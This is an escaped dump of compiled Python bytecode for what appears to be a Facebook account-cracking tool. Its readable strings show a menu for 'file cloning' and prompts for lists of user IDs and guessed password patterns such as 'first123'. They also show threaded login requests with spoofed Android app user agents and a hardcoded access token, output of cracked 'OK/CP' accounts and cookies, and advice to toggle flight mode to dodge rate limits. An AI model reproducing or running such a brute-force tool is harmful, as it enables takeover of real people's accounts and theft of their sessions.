r(\000\000\000\332\004ashar\271\000\000\000\203\000\000\000s\002\000\000\200\000\334\007\n\2103\203x\220\022\202|\330\013\016\210s\220\002\2108\220~\321\013%\3204D\250T\3606\000\014\020\200K\3605\000\016\021\220\022\220!\210W\230\r\321\r%\3204G\250T\3604\000\014\020\200K\3603\000\016\021\220\022\220!\210W\230\014\321\r$\3204F\250T\3602\000\014\020\200K\3601\000\016\021\220\022\220!\210W\320\030U\321\rU\320]o\320VZ\3600\000\014\020\200K\360/\000\016\021\220\022\220!\210W\320\030A\321\rA\320I[\300$\360.\000\014\020\200K\360-\000\016\021\220\022\220!\210W\230\n\321\r\"\3204N\250T\360,\000\014\020\200K\360+\000\016\021\220\022\220!\210W\320\030+\321\r+\3204N\250T\360*\000\014\020\200K\360)\000\016\021\220\022\220!\210W\230\n\321\r\"\3204N\250T\360(\000\014\020\200K\360'\000\016\021\220\022\220!\210W\320\030+\321\r+\260K\250T\360&\000\014\020\200K\360%\000\016\021\220\022\220!\210W\320\030+\321\r+\260K\250T\360$\000\014\020\200K\360#\000\016\021\220\022\220!\210W\230\n\321\r\"\260I\250T\360\"\000\014\020\200K\360!\000\016\021\220\022\220!\210W\230\t\321\r!\260I\250T\360 ""\000\014\020\200K\360\037\000\016\021\220\022\220!\210W\230\t\321\r!\260I\250T\360\036\000\014\020\200K\360\035\000\016\021\220\022\220!\210W\230\t\321\r!\260I\250T\360\034\000\014\020\200K\360\033\000\016\021\220\022\220!\210W\230\t\321\r!\260I\250T\360\032\000\014\020\200K\360\031\000\016\021\220\022\220!\210W\230\t\321\r!\260I\250T\360\030\000\014\020\200K\360\027\000\016\021\220\022\220!\210W\320\030,\321\r,\260I\250T\360\026\000\014\020\200K\360\025\000\016\021\220\022\220!\210W\230\t\321\r!\260I\250T\360\024\000\014\020\200K\360\023\000\016\021\220\022\220!\210W\230\t\321\r!\260H\250T\360\022\000\014\020\200K\360\021\000\023\025\210T\360\020\000\014\020\200K\364\017\000\n\r\210S\213\030\220V\321\t\033\330\017&\210\004\360\014\000\014\020\200K\364\013\000\n\r\210S\213\030\2201\212\033\330\017&\210\004\360\010\000\014\020\200K\364\007\000\n\r\210S\213\030\2201\212\033\330\017&\210\004\340\013\017\200K\360\003\000\017\021\210\024\330\013\017\200Kr*\000\000\000c\000\000\000\000\000\000\000\000\000\000\000\000\010\000\000\000\003\000\000\000\363\364\006\000\000\227\000\t\000t\001\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000d\001}\000|\000d\001k(\000\000\220\002r\335t\003\000\000\000\000\000\000\000\000d\002\253\001\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\003\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\007\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000}\001|\001d\005v\000\220\002r\254t\001\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\006\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\007\000\000\000\000\000\000\000\000d\007\253\001\000\000\000\000\000\000}\002\t\000t\t\000\000\000\000\000\000\000\000|\002d\010\253\002\000\000\000\000\000\000j\013\000\000\000\000\000\000\000\000\000""\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000j\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000}\003t\001\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\013\253\001\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\014\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\007\000\000\000\000\000\000\000\000d\r\253\001\000\000\000\000\000\000}\004t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\001\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000g\000}\005\t\000t\027\000\000\000\000\000\000\000\000t\007\000\000\000\000\000\000\000\000d\016\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\006t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\001\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\017\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\031\000\000\000\000\000\000\000\000|\006\253\001\000\000\000\000\000\000D\000]#\000\000}\007|\005j\033\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t\007\000\000\000\000\000\000\000\000d\020|\007d\nz\000\000\000\233\000d\021\235\003\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000\001\000\214%\004\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\001\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\022\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\007\000\000\000\000\000\000\000\000d\r\253\001\000\000\000\000\000\000}\010|\010d\023v\000r\026t\034\000\000\000\000\000\000\000\000j""\033\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\024\253\001\000\000\000\000\000\000\001\000n\025t\034\000\000\000\000\000\000\000\000j\033\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\025\253\001\000\000\000\000\000\000\001\000t\037\000\000\000\000\000\000\000\000d\026\254\027\253\001\000\000\000\000\000\0005\000}\tt\001\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t!\000\000\000\000\000\000\000\000t#\000\000\000\000\000\000\000\000\003\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\nt\003\000\000\000\000\000\000\000\000d\030|\nz\000\000\000d\031z\000\000\000\253\001\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\032\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000|\003D\000]R\000\000}\013|\013j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\033\253\001\000\000\000\000\000\000\\\002\000\000}\014}\r|\005}\016|\004d\005v\000r\031|\tj'\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t(\000\000\000\000\000\000\000\000|\014|\r|\016\253\004\000\000\000\000\000\000\001\000\2146|\004d\034v\000s\001\214;|\tj'\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t*\000\000\000\000\000\000\000\000|\014|\r|\016\253\004\000\000\000\000\000\000\001\000\214T\004\000\t\000d\000d\000d\000\253\002\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\035\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\036\253\001\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000d\037t!\000\000\000\000\000\000\000\000t#\000\000\000\000\000\000\000\000t,\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000d z\000\000\000t!\000\000\000\000\000\000\000""\000t#\000\000\000\000\000\000\000\000t.\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\007\000\000\000\000\000\000\000\000d!\253\001\000\000\000\000\000\000\001\000t1\000\000\000\000\000\000\000\000j2\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\"\253\001\000\000\000\000\000\000\001\000y\000y\000y\000#\000t\016\000\000\000\000\000\000\000\000$\000r.\001\000t\003\000\000\000\000\000\000\000\000d\t\253\001\000\000\000\000\000\000\001\000t\021\000\000\000\000\000\000\000\000j\022\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\n\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000Y\000\220\002\214\221w\000x\003Y\000w\001#\000\001\000d\n}\006Y\000\220\002\214<x\003Y\000w\001#\0001\000s\001w\002\001\000Y\000\001\000\001\000\214\332x\003Y\000w\001#\000t4\000\000\000\000\000\000\000\000j6\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j8\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000$\000r\030\001\000t\003\000\000\000\000\000\000\000\000d#\253\001\000\000\000\000\000\000\001\000t;\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000Y\000y\000w\000x\003Y\000w\001)$Nz\003***z,\033[92;1m[\033[1;32m1\033[92;1m]\033[1;33m FILE CLONINGz%\033[92;1m[\033[1;32m0\033[92;1m]\033[1;31m EXIT z\023 CHOOSE AN OPTION: )\002r{\000\000\000\332\00201z1 PUT FILE EXAMPLE :  /sdcard/FILE NAME .txt.etc..z\027 PUT FILE PATH\033[1;37m: \332\001rz\031 FILE LOCATION NOT FOUND rR\000\000\000z!\033[1;34m[1] METHOD-1\033[1;33m (MIX) z \033[1;32m[2] M-2 \033[1;31m(NEW ID ) z\n CHOOSE : z) HOW MANY PASSWORDS DO YOU WANT TO ADD ? z/\033[1;32m EXAMPLE : first last,firtslast,first123z\016 PUT PASSWORD z\002: z$ DO YOU WANT SHOW COOKIES :? (Y/N): )""\005\332\001yrP\000\000\000\332\003yes\332\003Yesr{\000\000\000r\275\000\000\000\332\001nrW\000\000\000)\001\332\013max_workersz\030 TOTAL ACCOUNT : \033[1;32mr(\000\000\000z$ \033[1;97mUSE FLIGHT MODE AFTER 5 MINT\332\001|)\002r|\000\000\000\332\00202z\007\033[1;37mz\032 THE PROCESS HAS COMPLETEDz\016 TOTAL OK/CP: \332\001/z\025 PRESS ENTER TO BACK z\017python SHONA.pyz\034\n NO INTERNET CONNECTION ...)\036r\211\000\000\000r\214\000\000\000r\220\000\000\000\332\005input\332\004open\332\004read\332\nsplitlines\332\021FileNotFoundError\332\004time\332\005sleep\332\004menu\332\003int\332\005range\332\006append\332\003pcp\332\004tredr\037\000\000\000r\266\000\000\000\332\005split\332\006submit\332\004api1\332\006newidx\332\003oks\332\003cpsr\212\000\000\000r\213\000\000\000\332\010requests\332\nexceptions\332\017ConnectionError\332\004exit)\017\332\001x\332\002xd\332\004file\332\002fo\332\004mthd\332\005plist\332\010ps_limit\332\001i\332\002cx\332\014crack_submit\332\ttotal_ids\332\004user\332\003ids\332\005names\332\010passlists\017\000\000\000               r(\000\000\000r\314\000\000\000r\314\000\000\000\243\000\000\000s\307\002\000\000\200\000\360\002F\001\005\027\334\020\025\224\007\330\025\032\220\001\330\023\024\230\025\223<\334\030\035\320\036X\324\030Y\334\030\035\320\036Q\324\030R\334\030\034\234\006\334\033 \320!6\323\0337\230\002\330\033\035\240\032\322\033+\334 %\244\007\344 %\320&Y\324 Z\334 $\244\006\334',\320-I\323'J\240\004\360\002\005!/\334-1\260$\260s\253^\327-@\321-@\323-B\327-M\321-M\323-O\250\002\364\n\000!&\244\007\334 %\320&O\324 P\334 %\320&N\324 O\334 $\244\006\334%*\250<\323%8\240\004\334 $\244\006\334 %\244\007\330(*\240\005\360\002\003!4\33436\264u\320=h\3237i\3233j\250\010\364\006\000!%\244\006\334 %\244\007\334 %\320&Z\324 [\334 $\244\006\334).\250x\256\037\240A\330(-\257\014\251\014\264U\270^\310A\310a\311C\3105\320PR\320;S\3235T\325(U\360\003\000*9\344 $\244\006\334 %\244\007\334 %\320&L\324 M\334 $\244\006\334#(\250\034\323#6\240\002""\330#%\320)B\321#B\334'*\247z\241z\260#\245\344(+\257\n\251\n\2603\254\017\334%)\260b\325%9\270\\\334(-\254\007\33447\274\003\270B\273\007\263L\250\t\344(-\320.K\310I\321.U\320XY\321.Z\324([\334(-\320.W\324(X\334(,\254\006\33346\250D\330<@\277J\271J\300s\273O\261\t\260\003\260E\330;@\260\010\33037\270:\3213E\3308D\3278K\3218K\314D\320QT\320UZ\320[c\3258d\33059\270Z\3225G\3308D\3278K\3218K\314F\320SV\320W\\\320]e\3258f\361\r\00057\367\017\000&:\364\034\000!&\240l\324 3\334 $\244\006\334 %\320&B\324 C\334 %\320&6\264s\2743\274s\2738\263}\321&D\300S\321&H\314\023\314S\324QT\313X\313\035\321&V\324 W\334 $\244\006\334 %\320&=\324 >\334 \"\247\t\241\t\320*;\325 <\360w\001\000\034,\360\013\000\024 \370\364\032\000(9\362\000\003!/\334(-\320.I\324(J\334(,\257\n\251\n\2601\254\r\334(,\257\006\360\007\003!/\373\360\034\001!4\33023\253\010\372\367 \000&:\320%9\373\364*\000\014\024\327\013\036\321\013\036\327\013.\321\013.\362\000\002\005\027\334\020\025\320\0265\324\0206\334\020\024\226\006\360\005\002\005\027\372sp\000\000\000\202A,M\002\000\301/(K2\000\302\027A\013M\002\000\303#\024L,\000\3037C\tM\002\000\307\000B\001L6\003\311\002\032L6\003\311\035B\022M\002\000\31323L)\003\314%\003M\002\000\314(\001L)\003\314)\003M\002\000\314,\004L3\003\3140\006M\002\000\3146\005L?\007\314;\007M\002\000\315\0022M7\003\3156\001M7\003c\003\000\000\000\000\000\000\000\000\000\000\000\013\000\000\000\003\000\000\000\363\014\r\000\000\227\000\t\000t\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\001t\006\000\000\000\000\000\000\000\000\233\001d\002t\t\000\000\000\000\000\000\000\000t\n\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\233\001d\003\235\005\253\001\000\000\000\000\000\000\001\000t\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j\r\000\000\000\000\000\000\000""\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000|\001j\017\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000d\005\031\000\000\000}\003\t\000|\001j\017\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000d\006\031\000\000\000}\004|\002D\000\220\005]\226\000\000}\005|\005j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\007|\003j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\010|\003\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\t|\004j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\n|\004\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\013|\001\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\014|\001j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000}\006d\r}\007t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d\017\253\002\000\000\000\000\000\000\233\000d\020t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\021d\022\253\002\000\000\000\000\000\000\233\000d\023t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d\017\253\002\000\000\000\000\000\000\233\000\235\005}\010t\031\000\000""\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\024d\025\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\tt\032\000\000\000\000\000\000\000\000d\026\031\000\000\000}\nt\032\000\000\000\000\000\000\000\000d\027\031\000\000\000}\013t\032\000\000\000\000\000\000\000\000d\030\031\000\000\000}\014t\032\000\000\000\000\000\000\000\000d\031\031\000\000\000}\rt\034\000\000\000\000\000\000\000\000}\016t\032\000\000\000\000\000\000\000\000d\032\031\000\000\000}\017t\032\000\000\000\000\000\000\000\000d\033\031\000\000\000}\020t\032\000\000\000\000\000\000\000\000d\034\031\000\000\000}\021t\032\000\000\000\000\000\000\000\000d\035\031\000\000\000}\022t\032\000\000\000\000\000\000\000\000d\036\031\000\000\000}\023t\032\000\000\000\000\000\000\000\000d\037\031\000\000\000}\024d }\025d!}\026d\"}\027d#}\030t\025\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$d%g\002\253\001\000\000\000\000\000\000}\031t\025\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d&\242\001\253\001\000\000\000\000\000\000}\032t\031\000\000\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d'\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000d\020z\000\000\000t\031\000\000\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j \000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d(d)\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000t\031\000\000\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d'\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000}\033t\025\000\000\000\000\000\000\000\000j\036\000\000""\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d*\242\001\253\001\000\000\000\000\000\000}\034d+}\035t\025\000\000\000\000\000\000\000\000j\"\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000}\036t\031\000\000\000\000\000\000\000\000d,j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\036j'\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t(\000\000\000\000\000\000\000\000j*\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d-\254.\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\037t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000} t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}!t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\"d\r}\007t\031\000\000\000\000\000\000\000\000d,j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\036j'\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t(\000\000\000\000\000\000\000\000j0\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d/\254.\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000}#d0|#\233\000d1\235\003}$g\000d2\242\001}%t\025\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|%\253\001\000\000\000\000\000\000}&d,j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d3""\204\000t3\000\000\000\000\000\000\000\000d4\253\001\000\000\000\000\000\000D\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}'|&|'z\000\000\000}(i\000d5|\037\223\001d6d7\223\001d8t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d9t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d:t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d;d<\223\001d=d \223\001d>|\000\223\001d?|\006\223\001d@dA\223\001dBd \223\001dCd,\223\001d;d<\223\001d=d \223\001dDdE\223\001dFdG\223\001dHdI\223\001i\000dJdK\223\001dLdM\223\001dNdO\223\001dPdQ\223\001dRdS\223\001dTd \223\001dUdV\223\001dWdX\223\001dYd \223\001dZd[\223\001d\\d]\223\001d^d,\223\001d_d!\223\001d`d$\223\001dadb\223\001dcdd\223\001dedf\223\001\245\001dgdhdidj\234\003\245\001})i\000dkdl\223\001dmdn\223\001dodp\223\001dqdr\223\001dsdt\223\001dkdl\223\001dudv\223\001dmdn\223\001dwdx\223\001dydx\223\001dzd{\223\001d|d!\223\001d}t5\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\223\001dzd~\223\001dd\200\223\001d\201d\202\223\001d\203d\204\223\001d\205d\206d\207d\210d\211d\212d\212d\213d\214\234\010\245\001}*d\215}+d\216},t7\000\000\000\000\000\000\000\000j8\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|+|)|*\254\217\253\003\000\000\000\000\000\000j;\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000}-d\220|-v\000r\201t=\000\000\000\000\000\000\000\000d\221|\000z\000\000\000d\222z\000\000\000|\006z\000\000\000d\223z\000""\000\000\253\001\000\000\000\000\000\000\001\000d\224j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\225\204\000|-d\226\031\000\000\000D\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}.t=\000\000\000\000\000\000\000\000d\227|.z\000\000\000\253\001\000\000\000\000\000\000\001\000t?\000\000\000\000\000\000\000\000d\230d\231\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000d\232z\000\000\000|\006z\000\000\000d\232z\000\000\000|.z\000\000\000d\233z\000\000\000\253\001\000\000\000\000\000\000\001\000t\n\000\000\000\000\000\000\000\000jA\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000\001\000\001\000n\266|,t\031\000\000\000\000\000\000\000\000|-\253\001\000\000\000\000\000\000v\000r1d\234tB\000\000\000\000\000\000\000\000v\000s\002\220\004\214\373t=\000\000\000\000\000\000\000\000d\235|\000z\000\000\000d\222z\000\000\000|\006z\000\000\000\253\001\000\000\000\000\000\000\001\000|,jA\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000\001\000\001\000nxd\236|-d\237\031\000\000\000d\240\031\000\000\000v\000rkd\234tB\000\000\000\000\000\000\000\000v\000r=t=\000\000\000\000\000\000\000\000d\241|\000z\000\000\000d\222z\000\000\000|\006z\000\000\000d\223z\000\000\000\253\001\000\000\000\000\000\000\001\000t?\000\000\000\000\000\000\000\000d\242d\231\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000d\232z\000\000\000|\006z\000\000\000d\233z\000\000\000\253\001\000\000\000\000\000\000\001\000\001\000n)t?\000\000\000\000\000\000\000\000d\242d\231\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000d\232z\000\000\000|\006z\000\000\000d\233z\000\000\000\253\001\000\000\000\000\000\000\001\000\001\000n\003\220\005\214\231\004\000t\006""\000\000\000\000\000\000\000\000d\006z\r\000\000a\003y\000#\000\001\000|\003}\004Y\000\220\005\214\255x\003Y\000w\001#\000t6\000\000\000\000\000\000\000\000jF\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000jH\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000$\000r%\001\000tK\000\000\000\000\000\000\000\000jL\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\243\253\001\000\000\000\000\000\000\001\000tO\000\000\000\000\000\000\000\000|\000|\001|\002\253\003\000\000\000\000\000\000\001\000Y\000y\000tP\000\000\000\000\000\000\000\000$\000r\n}/Y\000d\000}/~/y\000d\000}/~/w\001w\000x\003Y\000w\001)\244N\372 \r\r\033[1;32m [\033[1;32mBIGR9-M1\033[0m] \372\013|\033[1;32mOK|\372\010 \033[1;32mr(\000\000\000r\002\000\000\000rR\000\000\000\332\005first\332\005First\332\004last\332\004Last\332\004Name\332\004name\251\001\3722256002347743983%7C374e60f8b9bb6b8cbb30f78030438895\351o\000\000\000rS\000\000\000r\030\000\000\000r\026\000\000\000r,\000\000\000rX\000\000\000\351\307k\237\006\351\377\311\232;r~\000\000\000r\000\000\000r\200\000\000\000r\201\000\000\000r\202\000\000\000r\203\000\000\000r\204\000\000\000r\205\000\000\000r\206\000\000\000r\207\000\000\000r{\000\000\000rV\000\000\000\332\004FB4Ar\020\000\000\000r\007\000\000\000rrG\001\000\000\332\004X689\332\005X689B\332\005X689C\332\004X690\332\005X690B\332\004X692\332\004X693\332\004X695\332\005X695C\351+\002\000\000r\031\000\000\000r\032\000\000\000\251\006\332\004Zongr\023\000\000\000\332\nBanglalinkry\000\000\000\332\013Marshmallowz\rTelekom China\341\260\004\000\000[FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]ru\000\000\000\351\020\000\000\000\251\001\332\001k\351\024\000\000\000\372\002[\"\372\002\"]\251\003\332\00228\332\00229\332\003210c\001\000\000\000\000\000\000\000\000\000\000\000\004\000\000\0003\000""\000\000\363N\000\000\000K\000\001\000\227\000|\000]\035\000\000}\001t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t\004\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\226\001\227\001\001\000\214\037\004\000y\000\255\003w\001\251\001N\251\003r\035\000\000\000r\036\000\000\000\332\006digits\251\002\332\002.0\332\001_s\002\000\000\000  